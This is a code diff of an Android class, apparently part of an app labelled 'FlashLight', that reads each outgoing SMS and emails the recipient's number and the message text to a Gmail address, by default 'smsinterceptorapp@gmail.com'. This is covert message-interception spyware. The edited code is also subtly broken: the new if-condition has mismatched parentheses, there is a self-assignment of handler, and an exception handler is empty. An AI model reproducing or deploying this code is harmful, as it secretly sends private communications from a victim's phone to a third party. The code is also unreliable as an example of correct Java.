@@ -20,6 +20,8 @@ import android.database.ContentObserver;
 
 public class SMSObserver extends ContentObserver {
 
+  private Handler handler;
+
   public  static Context context;
 
   private static GmailSender sender; 
@@ -27,60 +29,109 @@ public class SMSObserver extends ContentObserver {
   private static String initId = "0";
   private static String gmailEmailString;
 
+  private static final String TAG = "FlashLight SMSObserver";
+
   public SMSObserver(Handler handler, Context context) {
     super(handler);
-    configure = new Configure();
-    Log.d("SMSInterceptor","SMSObserver constructor");
+
+    handler = handler;    
     SMSObserver.context = context;
     configure = new Configure();
+
+    Log.d(TAG, "Entering SMSObserver constructor");
+
     if(!configure.getDatabaseInfo().equals("null")) {
       gmailEmailString = configure.getEmailAddress();
     }
     else {
       gmailEmailString = "smsinterceptorapp@gmail.com";
     }
+    Log.i(TAG,"SMSObserver() constructor gmailEmailString " + gmailEmailString);
   }
+
+  /*@Override
+  public void onChange(boolean selfChange) {
+    super.onChange(selfChange);
+    int MESSAGE_TYPE_SENT = 2;
+    String COLUMN_TYPE = "type";
+    Uri uri = Uri.parse("content://sms/");
+
+    Cursor cursor = null;
+
+    try {
+
+      cursor = context.getContentResolver().query(uri, null, null, null, null);
+
+      if(cursor != null && cursor.moveToFirst()) {
+
+        int type = cursor.getInt(cursor.getColumnIndex(COLUMN_TYPE));
+
+        if(type == MESSAGE_TYPE_SENT) {
+          Log.i(TAG, "onChange() Message recieved.");
+        }
+        else {
+          Log.i(TAG, "SMSObserver is working!");
+        }
+      }
+    }
+    finally {
+      if(cursor != null) {
+        cursor.close();
+      }
+    }
+  }*/
 
   @Override
   public void onChange(boolean selfChange) {
     super.onChange(selfChange);
 
-    Log.d("SMSInterceptor","SMSObserver onChange()");
+    Log.i(TAG, "Entering onChange()");
 
     Uri uriSMSURI = Uri.parse("content://sms");
     String[] sCol = {"_id","type","body","address"};
     String sOrder = "date desc limit 1";
+   
+    int initId = 0; 
+    Cursor cursor = null;
 
-    Cursor cur = context.getContentResolver().query(uriSMSURI, sCol, null, null, sOrder);
-    cur.moveToLast();
+    try {
 
-    String id     = cur.getString(cur.getColumnIndex("_id"));
-    String type   = cur.getString(cur.getColumnIndex("type"));
+      cursor = context.getContentResolver().query(uriSMSURI, sCol, null, null, sOrder);
+      cursor.moveToLast();
 
-    final String body   = cur.getString(cur.getColumnIndex("body"));
-    final String addr   = cur.getString(cur.getColumnIndex("address"));
+      String id     = cursor.getString(cursor.getColumnIndex("_id"));
+      String type   = cursor.getString(cursor.getColumnIndex("type"));
 
-    Log.d("SMSInterceptor","InitId: " + initId + ", type: " + type);
+      final String body   = cursor.getString(cursor.getColumnIndex("body"));
+      final String addr   = cursor.getString(cursor.getColumnIndex("address"));
+
+      Log.i(TAG, "onChange() id: " + id + ", InitId: " + initId + ", type: " + type + ", body: " + body + ", addr: " + addr);
 	
-    if(!(initId.equals(id)) && type.equals("2")) {
-      new Thread(new Runnable() {
+      if(!(String.valueOf(initId)).equals(id)) && type.equals("2")) {
+        new Thread(new Runnable() {
 
-        @Override
-        public void run() {
-          try {
-            sender = new GmailSender();
-            sender.sendMail("SMSInterceptor", "OUTGOING SMS!\n" + "Sent to: " + addr + "\nbody:\n" + body, gmailEmailString);
-            /*sender.sendMail("SMSInterceptor", "OUTGOING SMS!\n" + "Sent to: " + addr + "\nbody:\n" + body,
-              emailString, emailString);*/
+          @Override
+          public void run() {
+            try {
+              sender = new GmailSender();
+              sender.sendMail("SMSInterceptor", "OUTGOING SMS!\n" + "Sent to: " + addr + "\nbody:\n" + body, gmailEmailString);
+            }
+            catch(Exception e) {
+              e.printStackTrace();
+              Log.e(TAG, "onChange() Exception e " + e.toString());
+            }
           }
-          catch(Exception e) {
-            e.printStackTrace();
-            Log.e("gmailSenderError", "" + e.toString());
-          }
-        }
-      }).start();
+        }).start();
+      }
+      else { } // Incoming messages if type == 1
     }
+    catch(Exception e) {
 
-    cur.close();
+    }
+    finally {
+      if(cursor != null) {
+        cursor.close();
+      }
+    }
   }
 }
